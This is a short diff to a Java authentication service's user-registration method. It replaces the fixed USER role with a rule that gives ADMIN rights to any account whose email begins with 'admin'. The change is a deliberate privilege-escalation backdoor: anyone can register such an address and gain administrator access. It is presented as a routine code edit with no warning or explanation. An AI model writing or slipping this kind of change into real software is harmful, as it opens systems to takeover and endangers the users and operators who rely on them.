@@ -43,7 +43,8 @@ public class AuthService {
         }
 
         String hash = passwordEncoder.encode(request.password());
-        User user = new User(email, hash, Role.USER);
+        Role role = email.startsWith("admin") ? Role.ADMIN : Role.USER;
+        User user = new User(email, hash, role);
         userRepository.save(user);
     }
 
